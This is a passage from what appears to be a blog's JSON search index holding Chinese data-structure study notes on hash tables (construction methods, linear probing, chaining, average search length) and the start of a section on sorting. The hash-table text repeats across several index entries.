构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#直接定址法"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#除留余数法"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#处理冲突的方法"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#1开放定址法开地址法"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#2链地址法拉链法"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#查找效率分析"},{"categories":["notice"],"content":"\r散列表的查找\r基本概念**基本思想：**记录的储存位置与关键字之间存在对应关系 对应关系——hash函数 **如何查找：**根据散列函数H(key)=k，查找key=9，则访问H(9)=9号地址，若内容为9则成功；若查不到，则返回一个特殊值，如空指针或空记录。 **优点：**查找效率高 **缺点：**空间效率低 **散列方法（杂凑法）：**选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比，确定查找是否成功。 **散列函数（杂凑函数）：**散列方法中使用的转换函数。 **散列表（杂凑表）：**按上述思想构造的表。 **散列函数：**H(key)=k **散列存储：**选取某个函数，依该函数按关键字计算元素的存储位置Loc(i)=H(keyi) **冲突：**不同的关键码映射到同一个散列地址key1≠key2，但是H(key1)=H(key2)，在散列查找方法中，冲突是不可避免的，只能尽可能减少。 **同义词：**具有相同函数 值的多个关键字。 散列函数的构造\r考虑的因素①执行速度(计算散列函数所需时间) ②关键字的长度 ③散列表的大小 ④关键字的分布情况 ⑤查找频率 两个要求①地址空间尽量小 ②存储分布尽量均匀，避免冲突 构造方法直接定址法 数字分析法 平方取中法 折叠法 除留余数法 随机数法 直接定址法Hash(key) = a·key + b (a、b为常数) **优点：**以关键码key的某个线性函数值为散列地址，不会产生冲突。 **缺点：**要占用连续地址空，空间效率低。 除留余数法Hash(key)=key mod p (p是一个整数) 设表长为m，取p\u003c=m且为质数 处理冲突的方法\r1.开放定址法(开地址法)**基本思想：**有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 常用方法： 线性探测法 其中：m为散列表长度 di为增量序列1，2，…m-1，且di=i **例：**关键码集为{47，7，29，11，16，92，22，8，3}，散列表表长为m=11，散列函数为Hash(key)=key mod 11；拟用线性探测法处理冲突。建散列表如下： 平均查找长度ASL=(1+2+1+1+1+4+1+2+2)/9=1.67 举一个查找失败的例子（线性探测）： 假设我们给出的哈希函数是H（key） = (key*3)%7 对于一个数去%7，算出来的值不会超过7，故而查找时计算出的哈希地址只可能是0、1、2、3、4、5、6 假设我们要查找一个关键字m,计算出的哈希地址为0， 1.先去探测哈希地址0，发现不是， 2.去探测哈希地址1，发现不是 2.去探测哈希地址2，发现是空位置 发现是空的，说明查找失败了 因此计算出的哈希地址为0的关键字，在该哈希表中查找失败的长度为3 同理，计算出的哈希地址为1的关键字，在该哈希表中查找失败的长度为2 计算出的哈希地址为2的关键字，在该哈希表中查找失败的长度为1 计算出的哈希地址为3的关键字，在该哈希表中查找失败的长度为2 … 根据上述的推导过程，我们就可以得出查找失败的所有情况。 故而，查找失败的情况只取决于哈希函数和空位置。 而对于一个需要查找的关键字，在还不知道具体数值的情况下，我们认为它计算出来的哈希地址落在每一个地址（0~6）的概率都相同，即1/7 根据数学期望的知识，可知查找失败的平均查找长度为： ASL = 3*（1/7）+ 2*（1/7）+1*（1/7）+2*（1/7）+1*（1/7）+5*（1/7）+4*（1/7）=18/7 二次探测法 伪随机探测法 2.链地址法(拉链法)**基本思想：**相同散列地址的记录链成一单链表。m个散列地址就设m个单链表，然后用一个数组将m个单链表的表头指针存储起来，形成一个动态的结构。 例如：一组关键字为{19,14,23,1,68,20,84,27,55,11,10,79}，散列函数为Hash(key)=key mod 13 链地址法优点： 非同义词不会冲突 链表上结点空间动态申请，更适合于表长不确定的情况 给定值查找值k，查找过程： 查找效率分析使用平均查找长度ASL来衡量查找算法，ASL取决于： 散列函数 处理冲突的方法 散列表的填装因子α α=表中填入的记录数/哈希表的长度 α越大，表中记录数越多，说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多。 ASL与填装因子α有关，既不是严格的O(1)，也不是O(n) 结论 散列表基数与有很好的平均性能，优于一些传统的技术 链地址法优于开地址法 除留余数法作散列函数优于其他类型函数 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#结论"},{"categories":["notice"],"content":"\r0x8排序","date":"2023-12-19","objectID":"/data_structure_notes/:8:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#0x8排序"},{"categories":["notice"],"content":"\r概述**什么是排序：**排序是将一组杂乱无章的数据按一定规律顺次排列起来 **排序的目的：**便于查找 排序方法分类\r按照存储介质分**内部排序：**数据量不大、数据在内存、无需内外存交换数据 **外部排序：**数据量较大、数据在外存（文件排序） 外部排序时，要将数据分批调入内存来排序，中间结果还要即使放入外存，外部排序要复杂得多。 按比较器个数分**串行排序：**单处理机(同一时刻比较一对元素) **并行排序：**多处理机(同一时刻比较多对元素) 按主要操作分**比较排序：**用比较的方法 插入排序，交换排序，选择排序，归并排序 **基数排序：**不比较元素的大小，仅仅根据元素本身的取值确定其有序位置。 按辅助空间分**原地排序：**辅助空间用量为O(1)的排序方法。 （所占的辅助存储空间与参与排序的数据量大小无关） **非原地排序：**辅助空间用量超过O(1)的排序方法。 按稳定性分**稳定排序：**能够使任何数值相等的元素，排序后相对次序 不变。 **非稳定性排序：**不是稳定排序的方法。 按自然性分**自然排序：**输入数据越有序，排序的速度越快的排序方法。 **非自然排序：**不是自然排序的方法。 记录序列以顺序表存储 #define MAXSIZE 20 typedef int KeyType; Typedef struct{ KeyType key; InfoType otherinfo; }RedType; typedef struct{ RedType r[MAXISIZE+1]; int length; }SqList; ","date":"2023-12-19","objectID":"/data_structure_notes/:8:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#概述"},{"categories":["notice"],"content":"\r概述**什么是排序：**排序是将一组杂乱无章的数据按一定规律顺次排列起来 **排序的目的：**便于查找 排序方法分类\r按照存储介质分**内部排序：**数据量不大、数据在内存、无需内外存交换数据 **外部排序：**数据量较大、数据在外存（文件排序） 外部排序时，要将数据分批调入内存来排序，中间结果还要即使放入外存，外部排序要复杂得多。 按比较器个数分**串行排序：**单处理机(同一时刻比较一对元素) **并行排序：**多处理机(同一时刻比较多对元素) 按主要操作分**比较排序：**用比较的方法 插入排序，交换排序，选择排序，归并排序 **基数排序：**不比较元素的大小，仅仅根据元素本身的取值确定其有序位置。 按辅助空间分**原地排序：**辅助空间用量为O(1)的排序方法。 （所占的辅助存储空间与参与排序的数据量大小无关） **非原地排序：**辅助空间用量超过O(1)的排序方法。 按稳定性分**稳定排序：**能够使任何数值相等的元素，排序后相对次序 不变。 **非稳定性排序：**不是稳定排序的方法。 按自然性分**自然排序：**输入数据越有序，排序的速度越快的排序方法。 **非自然排序：**不是自然排序的方法。 记录序列以顺序表存储 #define MAXSIZE 20 typedef int KeyType; Typedef struct{ KeyType key; InfoType otherinfo; }RedType; typedef struct{ RedType r[MAXISIZE+1]; int length; }SqList; ","date":"2023-12-19","objectID":"/data_structure_notes/:8:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#排序方法分类"},{"categories":["notice"],"content":"\r概述**什么是排序：**排序是将一组杂乱无章的数据按一定规律顺次排列起来 **排序的目的：**便于查找 